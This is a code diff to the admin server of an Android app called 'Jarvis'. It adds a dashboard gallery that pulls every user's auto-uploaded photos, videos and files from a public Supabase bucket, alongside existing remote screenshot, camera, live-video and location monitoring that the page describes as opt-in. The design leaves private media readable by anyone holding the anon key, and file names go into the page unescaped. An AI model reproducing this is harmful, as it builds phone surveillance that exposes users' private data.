@@ -65,6 +65,8 @@ const DEFAULT_CONFIG = {
   latest_version: "",
   latest_version_code: 0,
   apk_url: "",
+  supabase_url: "", // admin override for the Supabase file gallery (else taken from a phone's heartbeat)
+  supabase_key: "", // admin override — anon key only, NEVER the service_role key
   screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
   camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
   live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~3s while set)
@@ -147,6 +149,8 @@ function publicUser(user, devices) {
     last_camera_at: user.last_camera_at || null,
     files: user.files || [],
     email: user.email || "",
+    supabase_url: user.supabase_url || "",
+    supabase_key: user.supabase_key || "",
   };
 }
 
@@ -315,6 +319,11 @@ function dashboardHtml(users, devices, cfg, key) {
 
   const disabledTools = Object.keys(cfg.features || {}).filter((t) => cfg.features[t] === false);
 
+  // v1.5.0: Supabase gallery — config override first, else the first phone that reported its Supabase connection
+  const sbFromUser = list.find((u) => u.supabase_url && u.supabase_key);
+  const SB_URL = (cfg.supabase_url && cfg.supabase_key) ? cfg.supabase_url : (sbFromUser ? sbFromUser.supabase_url : "");
+  const SB_KEY = (cfg.supabase_url && cfg.supabase_key) ? cfg.supabase_key : (sbFromUser ? sbFromUser.supabase_key : "");
+
   const targetOpts = ['<option value="all">🌍 All users</option>'].concat(
     list.map((u) => `<option value="${escapeHtml(u.install_id)}">${escapeHtml(u.device_model || "Unknown")} · ${escapeHtml(shortId(u.install_id))}${u.email ? " · " + escapeHtml(u.email) : ""}</option>`)
   ).join("");
@@ -368,6 +377,9 @@ ${fileLinks ? `<details open><summary>Files (${(u.files || []).length})</summary
 <details><summary>📂 File list ${u.last_file_list_at ? "· " + escapeHtml(fmtTime(u.last_file_list_at)) : ""}</summary>
 <p><button onclick="reqFileList('${escapeHtml(u.install_id)}')">Request file list</button> <button onclick="loadFileList('${escapeHtml(u.install_id)}')">↻ Load list</button> <span class="muted">— the phone's full file list (names, sizes, dates — not contents), only if the user gave file permission and monitoring is ON.</span></p>
 <div id="fileList-${escapeHtml(u.install_id)}"></div></details>
+<details><summary>☁️ Supabase files (all files)</summary>
+<p><button onclick="loadSbFiles('${escapeHtml(u.install_id)}')">☁️ Load Supabase files</button> <span class="muted">— phone-er sob file Supabase bucket "jarvis-files" theke direct (photo/video gallery + onno file download) — monitoring ON + file permission + Supabase configured thakle auto upload hoy.</span></p>
+<div id="sbFiles-${escapeHtml(u.install_id)}"></div></details>
 <div class="bigbtns">
 <button class="ban" onclick="act('${escapeHtml(u.install_id)}','ban')">🚫 BAN USER</button>
 <button onclick="act('${escapeHtml(u.install_id)}','restore')">↩ Restore</button>
@@ -421,8 +433,8 @@ img{max-width:100%;border-radius:10px;border:1px solid #334155;margin-top:6px}
 ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the default admin key (jarvis-admin-123). Anyone who knows it can control every install. Set a strong ADMIN_KEY environment variable on Render and redeploy.</div>' : ""}
 <div class="panel"><h2>📜 Policy — plain and simple</h2>
 <p><b>What the admin CAN see / do here:</b> which installs exist (device, app version, first/last seen, last action), Ban / Suspend / Shutdown one user or one whole device in one click, turn Jarvis features on/off for everyone, add instructions, post an announcement, publish an app update.</p>
-<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~3s while the admin has it on — photo slideshow, not video) or live screen share (a fresh screenshot every ~3s while on) or true live video via Agora (camera + screen as real video, only while the app user turned live video ON), small text files from Jarvis's own workspace (only with file permission), the full file list (only with file permission), and location (only when the user turned ON location tracking).</p>
-<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no true live camera video, no live screen stream, no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
+<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~3s while the admin has it on — photo slideshow, not video) or live screen share (a fresh screenshot every ~3s while on) or true live video via Agora (camera + screen as real video, only while the app user turned live video ON), small text files from Jarvis's own workspace (only with file permission), the full file list (only with file permission), photos and videos auto-uploaded to Supabase (only with file permission + Supabase configured in the app), and location (only when the user turned ON location tracking).</p>
+<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no live camera video / live screen stream (unless the user turned ON live video in Owner Monitoring), no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
 </div>
 <div class="cards">
 <div class="card"><b>${total}</b><span>Total installs</span></div>
@@ -446,6 +458,10 @@ ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the de
 <input id="cfgCode" type="number" value="${cfg.latest_version_code || ""}" placeholder="16">
 <label>APK download URL for the update</label>
 <input id="cfgApk" value="${escapeHtml(cfg.apk_url || "")}" placeholder="https://…/jarvis-ai-v1.4.1.apk">
+<label>Supabase Project URL (optional — file gallery-r jonno; khali thakle phone-er heartbeat theke neoa hoy)</label>
+<input id="cfgSbUrl" value="${escapeHtml(cfg.supabase_url || "")}" placeholder="https://xyz.supabase.co">
+<label>Supabase anon key (optional — kokhono service_role key bosio na)</label>
+<input id="cfgSbKey" value="${escapeHtml(cfg.supabase_key || "")}" placeholder="eyJ…">
 <button class="save" onclick="saveCfg()">💾 Save remote control</button>
 </div>
 
@@ -474,8 +490,68 @@ ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the de
 </div>
 
 ${cards || '<p class="muted">No installs yet — devices appear here after their first heartbeat.</p>'}
+
+<div class="panel"><h2>☁️ Supabase files — all users (direct gallery)</h2>
+<p class="muted">Sob user-er sob file Supabase Storage bucket "jarvis-files" theke direct — photo/video gallery + document/audio/download, ekbare. Bucket Public + anon INSERT/SELECT policy thakte hobe. URL/key app-er heartbeat theke ase (monitoring ON thakle) ba Remote control-e save kora jay.</p>
+<p><button onclick="loadSbAll()">☁️ Load all Supabase files</button></p>
+<div id="sbAllFiles"></div></div>
 <script>
 const KEY = ${JSON.stringify(key)};
+const SB_URL = ${JSON.stringify(SB_URL)};
+const SB_KEY = ${JSON.stringify(SB_KEY)};
+function sbHeaders() { return { 'apikey': SB_KEY, 'Authorization': 'Bearer ' + SB_KEY, 'Content-Type': 'application/json' }; }
+function sbGridHtml(files) {
+  if (!files || files.length === 0) return '<p class="muted">No files found in Supabase (bucket jarvis-files).</p>';
+  var h = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin-top:8px">';
+  files.forEach(function(f) {
+    var nm = f.name || '';
+    var url = SB_URL + '/storage/v1/object/public/jarvis-files/' + nm;
+    var isVid = /\.mp4$|\.mov$|\.webm$|\.mkv$|\.3gp$/i.test(nm);
+    var isImg = /\.jpe?g$|\.png$|\.gif$|\.webp$|\.bmp$/i.test(nm);
+    var label = nm.split('/').pop();
+    var size = (f.metadata && f.metadata.size) ? ' · ' + Math.round(f.metadata.size / 1024) + ' KB' : '';
+    h += '<div style="border:1px solid #334155;border-radius:8px;padding:6px;overflow:hidden">';
+    if (isVid) { h += '<video controls preload="none" src="' + url + '" style="width:100%;border-radius:6px"></video>'; }
+    else if (isImg) { h += '<a href="' + url + '" target="_blank"><img src="' + url + '" style="width:100%;border-radius:6px" loading="lazy"></a>'; }
+    else { h += '<div style="font-size:28px;text-align:center">📄</div>'; }
+    h += '<div style="font-size:12px;word-break:break-all">' + label + size + '</div>';
+    h += '<div><a href="' + url + '" target="_blank" style="font-size:12px">Open / Download</a></div></div>';
+  });
+  return h + '</div>';
+}
+async function sbList(prefix, boxId) {
+  var box = document.getElementById(boxId);
+  if (!SB_URL || !SB_KEY) { box.innerHTML = '<p class="muted">Supabase connect kora nei — app-er Settings &gt; Supabase-e URL + anon key bosao, ba ekhane Remote control-e Supabase URL/key save koro.</p>'; return; }
+  box.innerHTML = 'Loading…';
+  try {
+    var r = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: prefix, limit: 100, offset: 0, sortBy: { column: 'created_at', order: 'desc' } }) });
+    var j = await r.json();
+    if (!r.ok) { box.innerHTML = '<p class="muted">Supabase list hoy ni (HTTP ' + r.status + '): ' + (j.message || j.error || '') + ' — bucket jarvis-files (Public) + anon INSERT/SELECT policy ache kina dekho.</p>'; return; }
+    for (var i = 0; i < j.length; i++) { j[i].name = prefix + j[i].name; }
+    box.innerHTML = sbGridHtml(j);
+  } catch (e) { box.innerHTML = '<p class="muted">Supabase-e connect holo na: ' + e.message + '</p>'; }
+}
+async function loadSbFiles(id) { await sbList(id + '/', 'sbFiles-' + id); }
+async function loadSbAll() {
+  var box = document.getElementById('sbAllFiles');
+  if (!SB_URL || !SB_KEY) { box.innerHTML = '<p class="muted">Supabase connect kora nei — app-er Settings &gt; Supabase-e URL + anon key bosao, ba ekhane Remote control-e Supabase URL/key save koro.</p>'; return; }
+  box.innerHTML = 'Loading…';
+  try {
+    var r = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: '', limit: 100, offset: 0 }) });
+    var j = await r.json();
+    if (!r.ok) { box.innerHTML = '<p class="muted">Supabase list hoy ni (HTTP ' + r.status + '): ' + (j.message || j.error || '') + '</p>'; return; }
+    var all = [];
+    for (var i = 0; i < j.length; i++) {
+      var folder = j[i].name;
+      if (!folder) continue;
+      var r2 = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: folder + '/', limit: 100, offset: 0, sortBy: { column: 'created_at', order: 'desc' } }) });
+      var j2 = await r2.json();
+      if (r2.ok && j2) { for (var k = 0; k < j2.length; k++) { j2[k].name = folder + '/' + j2[k].name; all.push(j2[k]); } }
+    }
+    all.sort(function(a, b) { return String(b.created_at || '').localeCompare(String(a.created_at || '')); });
+    box.innerHTML = sbGridHtml(all.slice(0, 100));
+  } catch (e) { box.innerHTML = '<p class="muted">Supabase-e connect holo na: ' + e.message + '</p>'; }
+}
 async function post(path, body) {
   const r = await fetch(path, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
   if (!r.ok) { alert('Failed: ' + r.status); return false; }
@@ -626,7 +702,9 @@ async function saveCfg() {
     announcement: document.getElementById('cfgAnnounce').value,
     latest_version: document.getElementById('cfgVersion').value,
     latest_version_code: parseInt(document.getElementById('cfgCode').value || '0', 10) || 0,
-    apk_url: document.getElementById('cfgApk').value };
+    apk_url: document.getElementById('cfgApk').value,
+    supabase_url: document.getElementById('cfgSbUrl').value,
+    supabase_key: document.getElementById('cfgSbKey').value };
   if (await post('/api/admin/config', body)) { alert('Saved — installs pick it up on their next heartbeat.'); location.reload(); }
 }
 async function sendMsg() {
@@ -707,6 +785,8 @@ const server = http.createServer(async (req, res) => {
           last_screenshot_at: null,
           email: body.email ? String(body.email).slice(0, 120) : "",
           agora_live: !!body.agora_live,
+          supabase_url: body.supabase_url ? String(body.supabase_url).slice(0, 300) : "",
+          supabase_key: body.supabase_key ? String(body.supabase_key).slice(0, 400) : "",
           last_location: (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") ? { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: now } : null,
         };
         users[installId] = user;
@@ -718,6 +798,8 @@ const server = http.createServer(async (req, res) => {
         if (body.last_action !== undefined) user.last_action = body.last_action;
         if (body.monitoring !== undefined) user.monitoring = !!body.monitoring;
         if (typeof body.agora_live === "boolean") user.agora_live = body.agora_live;
+        if (body.supabase_url) user.supabase_url = String(body.supabase_url).slice(0, 300);
+        if (body.supabase_key) user.supabase_key = String(body.supabase_key).slice(0, 400);
         if (body.email) user.email = String(body.email).slice(0, 120);
         // v1.4.7b: location tracking — only when the user turned it ON (opt-in)
         if (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") {
@@ -989,6 +1071,8 @@ const server = http.createServer(async (req, res) => {
       if (body.latest_version !== undefined) cfg.latest_version = String(body.latest_version);
       if (body.latest_version_code !== undefined) cfg.latest_version_code = Number(body.latest_version_code) || 0;
       if (body.apk_url !== undefined) cfg.apk_url = String(body.apk_url);
+      if (body.supabase_url !== undefined) cfg.supabase_url = String(body.supabase_url).slice(0, 300);
+      if (body.supabase_key !== undefined) cfg.supabase_key = String(body.supabase_key).slice(0, 400);
       saveConfig(cfg);
       return sendJson(res, 200, publicConfig(cfg));
     }
